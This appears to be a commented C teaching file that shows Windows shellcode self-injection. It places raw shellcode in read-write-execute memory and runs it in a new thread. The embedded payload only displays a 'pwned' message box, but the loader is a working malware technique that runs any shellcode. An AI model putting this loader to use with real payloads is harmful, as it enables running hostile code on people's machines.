/*
Author: Grayshader
Date: 27/02/2024
twitter: https://twitter.com/2300Denim18
linkedin: https://www.linkedin.com/in/advait-zende-780038259/

reference: 
    github: https://github.com/leetCipher/
*/


#include <Windows.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    // Define Message box shell code
    unsigned char shellcode[] =
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64" 
        "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e" 
        "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60" 
        "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b" 
        "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01" 
        "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d" 
        "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01" 
        "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01" 
        "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89" 
        "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45" 
        "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff" 
        "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64" 
        "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56" 
        "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24" 
        "\x52\xe8\x5f\xff\xff\xff\x68\x58\x20\x20\x20\x68\x72\x65" 
        "\x73\x73\x68\x70\x72\x6f\x67\x68\x20\x69\x6e\x20\x68\x77" 
        "\x6f\x72\x6b\x31\xdb\x88\x5c\x24\x10\x89\xe3\x68\x29\x58" 
        "\x20\x20\x68\x65\x72\x20\x3a\x68\x73\x68\x61\x64\x68\x67" 
        "\x72\x61\x79\x68\x20\x62\x79\x20\x68\x77\x6e\x65\x64\x68" 
        "\x6e\x20\x70\x61\x68\x20\x62\x65\x65\x68\x68\x61\x76\x65" 
        "\x68\x59\x6f\x75\x20\x31\xc9\x88\x4c\x24\x25\x89\xe1\x31" 
        "\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08";

    /*Here we will use 5 windows apis which make our functionality for self injection technique
     1.vitualalloc : to allocate memory 
     2.RtlCopyMemory: to read and write in allocated memory space
     3.CreateThread: for use of multithreading and concurrency
     4.WaitForSingleObject: execution to be held until the thread returns and shell code is executed
     5.VirtualFree:to release allocated memory*/

    // Allocate memory using VirtualAlloc
    
    LPVOID allocated_mem = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    /* Here we have used  VirtualAlloc api to create and allocate memory block
        now this api has arguments like 
        VirtualAlloc(1, 2, 3, 4)
        
            1. base address of memory dump that we want to allocate we will set this to null and leave it os to decide 
            2. how much memory we have to allocate so we have set it to size of shellcode
            3. here we have set two flags first for reserving (saying that we have reserved memory page)
               flag named MEM_reserve and second is for commiting the reserved page by flag named MEM_Commit and combining both with pipe(|)
            4.the last arguement is to set read write execute operations for the page
    if virtual alloc works properly then it returns a  void pointer to base address of memory space  here LPVOID is nothing but long pointer void
    */
   if (allocated_mem==NULL){
        printf("Failed to allocate memory: %d\n",GetLastError());
    return 1;
   }

    //print the allocated address 
    printf("Memory Allocated at address: 0x%p\n", allocated_mem);

    // Write shellcode to the allocated memory
    RtlCopyMemory(allocated_mem, shellcode, sizeof(shellcode));

    /* the RtlCopyMemory API has attributes destination here allocated_mem and source shellcode and size of shellcode */

     printf("Shellcode is written to allocated memory!\n");

    // Create thread to execute the MessageBox shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

    /*if thread created succesfully the createthread api returns handle to created thread */

    if (hThread == NULL) {
		printf("Failed to create thread: %d\n", GetLastError());
        return 1;
    }

    /*since we dont want to terminate program until our shell code has finished execution we pause or halt execution here*/

    // Halt execution until created thread returns
    WaitForSingleObject(hThread, INFINITE);

     // Close handle to thread
    CloseHandle(hThread);
    // Free allocated memory
    VirtualFree(allocated_mem, 0, MEM_RELEASE);

    return 0;

}